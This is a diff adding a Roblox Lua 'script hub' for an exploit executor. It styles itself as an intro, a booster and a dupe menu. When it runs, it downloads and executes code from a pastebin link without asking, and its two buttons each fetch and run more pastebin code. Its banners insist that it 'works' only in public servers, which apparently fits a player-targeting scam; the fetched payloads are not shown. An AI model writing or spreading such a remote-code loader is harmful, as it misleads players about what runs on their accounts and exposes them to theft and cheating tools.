@@ -1,0 +1,331 @@
+-- SETTINGS
+local INTRO_TIME = 5
+local INTRO_TIMEOUT = 40
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- ========== INTRO + WAIT ==========
+local containers = { LocalPlayer:WaitForChild("PlayerGui") }
+pcall(function() table.insert(containers, CoreGui) end)
+if gethui then pcall(function() table.insert(containers, gethui()) end) end
+
+local before = {}
+for _, c in ipairs(containers) do
+    for _, g in ipairs(c:GetChildren()) do before[g] = true end
+end
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/DBzgFdTC"))()
+end)
+
+task.wait(0.5)
+local introGuis = {}
+for _, c in ipairs(containers) do
+    for _, g in ipairs(c:GetChildren()) do
+        if not before[g] and g:IsA("ScreenGui") then table.insert(introGuis, g) end
+    end
+end
+
+if #introGuis > 0 then
+    local t = 0
+    while t < INTRO_TIMEOUT do
+        local alive = false
+        for _, g in ipairs(introGuis) do
+            if g.Parent then alive = true break end
+        end
+        if not alive then break end
+        task.wait(0.25)
+        t += 0.25
+    end
+else
+    task.wait(INTRO_TIME)
+end
+
+-- ========== HELPERS ==========
+local function corner(obj, r)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, r)
+    c.Parent = obj
+    return c
+end
+
+local function stroke(obj, color, thickness)
+    local s = Instance.new("UIStroke")
+    s.Color = color
+    s.Thickness = thickness
+    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    s.Parent = obj
+    return s
+end
+
+local function gradient(obj, c1, c2, rot)
+    local g = Instance.new("UIGradient")
+    g.Color = ColorSequence.new(c1, c2)
+    g.Rotation = rot or 90
+    g.Parent = obj
+    return g
+end
+
+local function tween(obj, time, props, style, dir)
+    local t = TweenService:Create(obj, TweenInfo.new(time, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props)
+    t:Play()
+    return t
+end
+
+-- ========== GUI ==========
+local parent = (gethui and gethui()) or LocalPlayer:WaitForChild("PlayerGui")
+local old = parent:FindFirstChild("CombinedHub")
+if old then old:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "CombinedHub"
+gui.ResetOnSpawn = false
+gui.Parent = parent
+
+local FULL_SIZE = UDim2.new(0, 300, 0, 290)
+local MINI_SIZE = UDim2.new(0, 300, 0, 40)
+
+local frame = Instance.new("Frame")
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.Size = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.ClipsDescendants = true
+frame.Parent = gui
+corner(frame, 14)
+gradient(frame, Color3.fromRGB(28, 24, 48), Color3.fromRGB(14, 14, 22), 90)
+local frameStroke = stroke(frame, Color3.fromRGB(140, 90, 255), 2)
+
+-- Title bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 40)
+titleBar.BackgroundColor3 = Color3.fromRGB(120, 70, 255)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = frame
+gradient(titleBar, Color3.fromRGB(150, 80, 255), Color3.fromRGB(60, 120, 255), 0)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -80, 1, 0)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🚀 SCRIPT HUB 💎"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 17
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+local function topButton(text, xOffset, color)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 26, 0, 26)
+    b.Position = UDim2.new(1, xOffset, 0, 7)
+    b.BackgroundColor3 = color
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 14
+    b.Parent = titleBar
+    corner(b, 8)
+    return b
+end
+
+local closeBtn = topButton("✖", -34, Color3.fromRGB(220, 60, 70))
+local miniBtn = topButton("➖", -64, Color3.fromRGB(70, 70, 95))
+
+closeBtn.MouseButton1Click:Connect(function()
+    tween(frame, 0.25, { Size = UDim2.new(0, 0, 0, 0) }, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+    task.wait(0.3)
+    gui:Destroy()
+end)
+
+local minimized = false
+miniBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    miniBtn.Text = minimized and "➕" or "➖"
+    tween(frame, 0.3, { Size = minimized and MINI_SIZE or FULL_SIZE }, Enum.EasingStyle.Quint)
+end)
+
+-- ========== LIVE NOTIFICATION BANNER ==========
+local isPrivate = (game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0)
+
+local banner = Instance.new("Frame")
+banner.Size = UDim2.new(1, -24, 0, 50)
+banner.Position = UDim2.new(0, 12, 0, 50)
+banner.BackgroundColor3 = Color3.fromRGB(70, 20, 25)
+banner.BorderSizePixel = 0
+banner.Parent = frame
+corner(banner, 10)
+local bannerStroke = stroke(banner, Color3.fromRGB(255, 70, 80), 1.5)
+
+local bannerText = Instance.new("TextLabel")
+bannerText.Size = UDim2.new(1, -16, 1, 0)
+bannerText.Position = UDim2.new(0, 8, 0, 0)
+bannerText.BackgroundTransparency = 1
+bannerText.TextWrapped = true
+bannerText.TextColor3 = Color3.fromRGB(255, 255, 255)
+bannerText.Font = Enum.Font.GothamBold
+bannerText.TextSize = 12
+bannerText.Parent = banner
+
+local messages = {
+    "⚠️ 100% NOT WORKING IF YOU EXECUTE THIS IN YOUR PRIVATE SERVER ❌",
+    "🌐 Use a PUBLIC SERVER for the best results ✅",
+    "🔔 Tap a button below to load a script",
+    "👤 Welcome, " .. LocalPlayer.DisplayName .. "! 🎉",
+}
+
+task.spawn(function()
+    local i = 1
+    while gui.Parent do
+        bannerText.Text = messages[i]
+        tween(bannerText, 0.4, { TextTransparency = 0 })
+        task.wait(3.2)
+        tween(bannerText, 0.4, { TextTransparency = 1 })
+        task.wait(0.45)
+        i = i % #messages + 1
+    end
+end)
+
+-- Pulsing red glow on the banner
+task.spawn(function()
+    while gui.Parent do
+        tween(bannerStroke, 0.7, { Transparency = 0.8 })
+        task.wait(0.75)
+        tween(bannerStroke, 0.7, { Transparency = 0 })
+        task.wait(0.75)
+    end
+end)
+
+-- ========== SCRIPT BUTTONS ==========
+local function makeButton(text, yPos, url, c1, c2)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -24, 0, 54)
+    btn.Position = UDim2.new(0, 12, 0, yPos)
+    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBlack
+    btn.TextSize = 16
+    btn.AutoButtonColor = false
+    btn.Parent = frame
+    corner(btn, 12)
+    gradient(btn, c1, c2, 0)
+    local s = stroke(btn, Color3.fromRGB(255, 255, 255), 1)
+    s.Transparency = 0.7
+
+    btn.MouseEnter:Connect(function()
+        tween(btn, 0.15, { Size = UDim2.new(1, -16, 0, 58), Position = UDim2.new(0, 8, 0, yPos - 2) })
+        tween(s, 0.15, { Transparency = 0 })
+    end)
+    btn.MouseLeave:Connect(function()
+        tween(btn, 0.15, { Size = UDim2.new(1, -24, 0, 54), Position = UDim2.new(0, 12, 0, yPos) })
+        tween(s, 0.15, { Transparency = 0.7 })
+    end)
+
+    btn.MouseButton1Click:Connect(function()
+        btn.Text = "⏳ Loading..."
+        local ok = pcall(function()
+            loadstring(game:HttpGet(url))()
+        end)
+        btn.Text = ok and "✅ Loaded!" or "❌ Failed"
+        task.wait(2)
+        btn.Text = text
+    end)
+end
+
+makeButton("⚡ UNIQUE BOOSTER", 110, "https://pastebin.com/raw/sa12W9ER",
+    Color3.fromRGB(255, 140, 40), Color3.fromRGB(255, 70, 110))
+makeButton("🎭 FAKE DUPE", 174, "https://pastebin.com/raw/4mtMitJ7",
+    Color3.fromRGB(40, 190, 255), Color3.fromRGB(130, 80, 255))
+
+-- ========== FOOTER (live server status) ==========
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, -24, 0, 40)
+footer.Position = UDim2.new(0, 12, 0, 240)
+footer.BackgroundColor3 = Color3.fromRGB(10, 10, 16)
+footer.BorderSizePixel = 0
+footer.TextColor3 = Color3.fromRGB(200, 200, 220)
+footer.Font = Enum.Font.GothamMedium
+footer.TextSize = 12
+footer.Parent = frame
+corner(footer, 8)
+
+task.spawn(function()
+    while gui.Parent do
+        local ping = 0
+        pcall(function()
+            ping = math.floor(LocalPlayer:GetNetworkPing() * 2000)
+        end)
+        local server = isPrivate and "🔒 Private Server ⚠️" or "🌐 Public Server ✅"
+        footer.Text = server .. "\n📶 Ping: " .. ping .. " ms  |  👥 " .. #Players:GetPlayers() .. " players"
+        footer.TextColor3 = isPrivate and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(130, 255, 160)
+        task.wait(1)
+    end
+end)
+
+-- ========== TOAST POPUP (slides in from top) ==========
+local toast = Instance.new("TextLabel")
+toast.Size = UDim2.new(0, 320, 0, 44)
+toast.AnchorPoint = Vector2.new(0.5, 0)
+toast.Position = UDim2.new(0.5, 0, 0, -60)
+toast.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+toast.Text = "🔔 Hub loaded! ⚠️ Public servers only!"
+toast.TextColor3 = Color3.fromRGB(255, 255, 255)
+toast.Font = Enum.Font.GothamBold
+toast.TextSize = 13
+toast.Parent = gui
+corner(toast, 12)
+stroke(toast, Color3.fromRGB(140, 90, 255), 2)
+
+-- ========== POP-IN ==========
+tween(frame, 0.5, { Size = FULL_SIZE }, Enum.EasingStyle.Back)
+task.delay(0.4, function()
+    tween(toast, 0.5, { Position = UDim2.new(0.5, 0, 0, 20) }, Enum.EasingStyle.Back)
+    task.wait(4)
+    tween(toast, 0.4, { Position = UDim2.new(0.5, 0, 0, -60) })
+end)
+
+-- Rainbow-ish border animation
+task.spawn(function()
+    local h = 0
+    while gui.Parent do
+        h = (h + 0.004) % 1
+        frameStroke.Color = Color3.fromHSV(h, 0.6, 1)
+        task.wait()
+    end
+end)
+
+-- ========== DRAGGING ==========
+local dragging, dragStart, startPos
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
